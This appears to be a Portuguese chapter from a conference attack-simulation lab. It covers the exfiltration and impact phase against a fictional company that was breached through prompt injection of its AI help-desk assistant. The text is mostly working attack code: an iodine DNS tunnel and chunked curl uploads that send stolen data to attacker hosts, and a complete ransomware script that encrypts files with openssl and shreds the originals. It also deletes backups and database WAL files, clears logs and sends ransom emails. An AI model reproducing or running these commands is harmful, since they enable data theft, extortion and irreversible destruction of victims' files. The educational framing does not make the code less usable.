# Fase 5: Exfiltração e Impacto

> Operação Phantom Helper — Milvus Summit 2026
> MITRE ATT&CK: T1048.001, T1486, T1485, T1657

---

## Objetivo da Fase

Completar a exfiltração dos dados e executar o impacto final — ransomware seletivo nos servidores de arquivo e banco de dados — para maximizar o dano e garantir o recebimento do resgate.

---

## 5.1 Exfiltração via DNS Tunneling

O DNS tunneling é uma das técnicas de exfiltração mais difíceis de detectar porque usa o protocolo DNS (porta 53/UDP) — frequentemente permitido mesmo em redes altamente restritivas, pois é necessário para a resolução de nomes.

### 5.1.1 Configuração do Servidor DNS Malicioso

```bash
# No servidor do atacante (simulado — infraestrutura C2)
# Instalar iodine server
apt-get install -y iodine

# Configurar zona DNS no domínio do atacante
# No arquivo de zona do servidor DNS:
# tunnel.attacker.com.  NS  ns.attacker.com.
# ns.attacker.com.      A   [IP_ATACANTE]

# Iniciar servidor iodine
iodined -f -c -P Phantom@DNS2026 10.99.99.1 tunnel.attacker.com

# Verificar se está ouvindo
netstat -ulnp | grep iodine
```

### 5.1.2 Configuração do Cliente DNS Tunneling (Servidor Comprometido)

```bash
# No servidor de IA comprometido (192.168.20.10)
# Via sessão Meterpreter ou SSH

# Instalar iodine client
apt-get install -y iodine

# Estabelecer túnel DNS
iodine -f -P Phantom@DNS2026 tunnel.attacker.com &

# Verificar estabelecimento do túnel
ip addr show dns0
# 6: dns0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1130 qdisc fq_codel state UNKNOWN
#     inet 10.99.99.2/27 scope global dns0
#        valid_lft forever preferred_lft forever

# Testar conectividade com o servidor atacante via túnel
ping -c 3 10.99.99.1

# Exfiltrar dados via túnel DNS
# Compactar todos os dados coletados
tar -czf /tmp/loot_phantom.tar.gz \
    /tmp/export_20250407_114733.csv \
    /tmp/dump_clientes_completo.csv \
    /tmp/dump_contratos.csv

# Transferir via SSH através do túnel
scp /tmp/loot_phantom.tar.gz root@10.99.99.1:/loot/techassist/

echo "Exfiltração via DNS tunnel concluída!"
echo "Dados exfiltrados: $(du -sh /tmp/loot_phantom.tar.gz)"
```

### 5.1.3 Exfiltração Alternativa via HTTPS

```bash
# Método alternativo: exfiltração via HTTPS para servidor externo
# Usando o próprio servidor de IA como ponto de saída

# Dividir arquivo em partes para evitar detecção por tamanho
split -b 1M /tmp/loot_phantom.tar.gz /tmp/chunk_

# Enviar cada parte via curl (HTTPS)
for chunk in /tmp/chunk_*; do
    chunk_name=$(basename $chunk)
    curl -s -X POST \
        "https://phantom-collect.onion/upload" \
        -H "X-Session: PhantomHelper2026" \
        -F "file=@${chunk}" \
        -F "name=${chunk_name}" \
        --socks5-hostname 127.0.0.1:9050
    echo "Chunk enviado: ${chunk_name}"
    sleep 5
done

echo "Exfiltração HTTPS completa!"
```

---

## 5.2 Coleta Final de Dados via SMB

```bash
# Conectar ao servidor de arquivos e fazer download final
# Usando credenciais Domain Admin

# Montar todos os compartilhamentos
for share in Confidencial Contratos Backup_2024 RH Financeiro; do
    mkdir -p /root/loot/smb/$share
    mount -t cifs //192.168.10.30/$share /root/loot/smb/$share \
        -o username=backup.admin,password=Phantom@2026!,domain=TECHASSIST
    echo "[+] Compartilhamento montado: $share"
done

# Copiar tudo recursivamente
cp -r /root/loot/smb/* /root/loot/final/
du -sh /root/loot/final/
# Resultado esperado: ~2.3 GB de dados corporativos

# Criar inventário do que foi coletado
find /root/loot/final -type f | sort > /root/loot/inventario.txt
wc -l /root/loot/inventario.txt
echo "Total de arquivos exfiltrados: $(cat /root/loot/inventario.txt | wc -l)"
```

---

## 5.3 Ransomware Seletivo

**AVISO EDUCACIONAL**: O código a seguir é demonstrativo. Em um ambiente real, ransomware causa danos irreversíveis. Em laboratório, os arquivos originais devem ser mantidos em backup antes de qualquer teste.

### 5.3.1 Script de Criptografia

```bash
#!/bin/bash
# PHANTOM RANSOMWARE — SCRIPT DEMONSTRATIVO
# Para uso EXCLUSIVO em ambiente de laboratório controlado
# Não executar em sistemas reais

PHANTOM_KEY="PHANTOM_OPERATION_2026_AES256_KEY"
RANSOM_EXT=".phantom"
RANSOM_NOTE="PHANTOM_RANSOM_NOTE.txt"

RANSOM_NOTE_CONTENT="
==================================================================
                    PHANTOM OPERATION 2026
==================================================================

Todos os seus arquivos foram CRIPTOGRAFADOS.

Seus dados foram exfiltrados e armazenados em servidores seguros.
Você tem 72 horas para pagar o resgate antes da publicação.

DADOS COMPROMETIDOS:
- 15.247 registros de clientes (CPF, email, dados bancários)
- 847 contratos e documentos confidenciais
- Dados financeiros e folha de pagamento
- Emails corporativos

VALOR DO RESGATE: 50 BTC (≈ R$ 15.000.000)

INSTRUÇÕES:
1. Acesse: http://phantom-payment.onion (use Tor Browser)
2. Insira seu ID de vítima: TECHASSIST-2025-04-07
3. Siga as instruções de pagamento

AVISO: Qualquer tentativa de restaurar arquivos sem a chave
       resultará na publicação imediata dos dados.

O PHANTOM
==================================================================
"

# Função de criptografia
encrypt_directory() {
    local target_dir=$1
    echo "[*] Criptografando: $target_dir"

    # Criar nota de resgate no diretório
    echo "$RANSOM_NOTE_CONTENT" > "$target_dir/$RANSOM_NOTE"

    # Criptografar cada arquivo
    find "$target_dir" -type f \
        ! -name "$RANSOM_NOTE" \
        ! -name "*.phantom" | while read -r file; do

        # Criptografar com AES-256-CBC
        openssl enc -aes-256-cbc \
            -salt \
            -in "$file" \
            -out "${file}${RANSOM_EXT}" \
            -k "$PHANTOM_KEY" \
            2>/dev/null

        if [ $? -eq 0 ]; then
            # Apagar arquivo original com sobreescrita segura
            shred -u -z -n 3 "$file" 2>/dev/null
            echo "  [+] Criptografado: $(basename $file)"
        else
            echo "  [-] Erro: $(basename $file)"
        fi
    done
}

# Verificar se está em modo de laboratório (proteção)
if [ "$1" != "--lab-confirmed" ]; then
    echo "MODO DE LABORATÓRIO: Simulando criptografia sem executar"
    echo "Para executar em lab, use: $0 --lab-confirmed [diretório]"
    echo ""
    echo "Alvos que seriam criptografados:"
    find "${2:-/mnt/shares}" -type f | head -20
    echo "..."
    exit 0
fi

# Executar criptografia nos alvos (somente com flag explícita)
TARGET_DIRS=(
    "/mnt/smb/Confidencial"
    "/mnt/smb/Contratos"
    "/mnt/smb/Financeiro"
)

echo "[*] Iniciando Phantom Ransomware..."
echo "[*] Alvos: ${TARGET_DIRS[*]}"
echo ""

for dir in "${TARGET_DIRS[@]}"; do
    if [ -d "$dir" ]; then
        encrypt_directory "$dir"
    else
        echo "[-] Diretório não encontrado: $dir"
    fi
done

echo ""
echo "[*] Operação concluída."
echo "[*] Arquivos criptografados com extensão: $RANSOM_EXT"
echo "[*] Nota de resgate criada: $RANSOM_NOTE"
```

### 5.3.2 Execução via Meterpreter no Servidor de Arquivos

```bash
# Na sessão Meterpreter (servidor de IA como pivot)
# Fazer pivot para o servidor de arquivos

meterpreter > portfwd add -l 2222 -p 22 -r 192.168.10.30

# Em outro terminal Kali
ssh -p 2222 root@127.0.0.1

# No servidor de arquivos (via SSH com pivot):
# Executar script de ransomware
bash /tmp/phantom_ransom.sh --lab-confirmed /srv/samba/shares
```

---

## 5.4 Destruição de Backups

Uma operação de ransomware profissional sempre inclui a destruição dos backups — para impedir a recuperação sem pagamento.

```bash
# Acessar o compartilhamento de backups
smbclient //192.168.10.30/Backup_2024 \
    -U 'TECHASSIST\backup.admin%Phantom@2026!'

# Listar e deletar backups
smb: \> ls
smb: \> del *.bak
smb: \> del *.tar.gz
smb: \> del *.dump
smb: \> del *.sql

# Verificar se há backups na VM do PostgreSQL
ssh root@192.168.10.40

# No servidor de BD — remover backups locais
find /var/lib/postgresql/backups -type f -name "*.dump" -exec shred -u {} \;
find /var/backups -name "*.gz" -exec shred -u {} \;

# Também remover o WAL archive (impede point-in-time recovery)
rm -rf /var/lib/postgresql/15/main/pg_wal/*

echo "Backups destruídos."
```

---

## 5.5 Cobertura de Rastros

```bash
# Limpar rastros no servidor de IA
ssh root@192.168.20.10

# Limpar logs do ARIA
echo "" > /var/log/aria/aria.log
echo "" > /var/log/nginx/access.log
echo "" > /var/log/nginx/error.log

# Limpar histórico do bash
history -c
echo "" > ~/.bash_history

# Limpar logs do sistema (cuidado — pode alertar o SIEM por ausência)
# Em um ataque real, o atacante modificaria logs seletivamente
# Aqui, simplesmente limpamos para o exercício

# Modificar timestamps dos arquivos criados
touch -t 202501010000 /opt/aria/.config/aria-health-check

# Verificar se backdoor ainda está ativo
systemctl status aria-health.service
crontab -l
```

---

## 5.6 Nota de Resgate nos Servidores

```bash
# Deixar nota de resgate em múltiplos locais

NOTA_RESGATE="
╔════════════════════════════════════════════════════╗
║         OPERAÇÃO PHANTOM HELPER — 2025             ║
╠════════════════════════════════════════════════════╣
║                                                    ║
║  Seus dados foram comprometidos.                   ║
║  15.247 registros de clientes exfiltrados.         ║
║  847 contratos copiados.                           ║
║  Sistemas críticos criptografados.                 ║
║                                                    ║
║  PRAZO: 72 horas para contato.                    ║
║  ID: TECHASSIST-2025-04-07                         ║
║  Contato: phantom-contact@onion                    ║
║                                                    ║
║  O ponto de entrada foi sua IA de help desk.       ║
║  Talvez valha investir em segurança da IA          ║
║  na próxima vez.                                   ║
║                                                    ║
║               — The Phantom                        ║
╚════════════════════════════════════════════════════╝
"

# Salvar nota em locais visíveis
echo "$NOTA_RESGATE" > /mnt/smb/Confidencial/LEIA-ME.txt
echo "$NOTA_RESGATE" > /mnt/smb/Contratos/LEIA-ME.txt
echo "$NOTA_RESGATE" > ~/Desktop/PHANTOM_RANSOM.txt

# Enviar nota por email via SMTP comprometido
# (para garantir que os administradores vejam)
curl -s smtp://192.168.10.20 \
    --mail-from "phantom@theattacker.com" \
    --mail-rcpt "admin.ti@techassist.com.br" \
    --mail-rcpt "joao.ceo@techassist.com.br" \
    --mail-rcpt "rafael.gomes@techassist.com.br" \
    -T /tmp/ransom_email.txt
```

---

## 5.7 Resumo da Operação Completa

```
╔══════════════════════════════════════════════════════════════════╗
║             OPERAÇÃO PHANTOM HELPER — RESUMO FINAL              ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  DURAÇÃO TOTAL: 6 horas 52 minutos                               ║
║  VETOR INICIAL: Chat público de help desk (prompt injection)    ║
║  PRIMEIRA DETECÇÃO: 14h47 (erro de permissão ao tentar shell)   ║
║                                                                  ║
║  DADOS EXFILTRADOS:                                              ║
║  ├── 15.247 registros de clientes (PII + financeiro)            ║
║  ├── 847 documentos de contratos                                ║
║  ├── Dados financeiros (DRE, faturamento, folha)                ║
║  └── Emails corporativos (CEO + board)                          ║
║                                                                  ║
║  SISTEMAS COMPROMETIDOS:                                         ║
║  ├── AI Engine Server (ARIA) — shell root + backdoor             ║
║  ├── Active Directory — 2 contas Domain Admin criadas            ║
║  ├── Servidor de Arquivos — criptografado + backups destruídos   ║
║  ├── PostgreSQL — dados exportados e WAL destruído               ║
║  └── Email Server — acesso à caixa do CEO                       ║
║                                                                  ║
║  IMPACTO ESTIMADO: R$ 3.480.000+                                 ║
║  CUSTO DE PREVENÇÃO TERIA SIDO: < R$ 50.000                     ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
```

---

**Próximo passo**: `05-impacto/impacto-negocio.md` — Análise detalhada do impacto no negócio.

---

*Operação Phantom Helper — Milvus Summit 2026*
*Almir Meira Alves — Meira e Sousa Ltda — Educa com Talento*
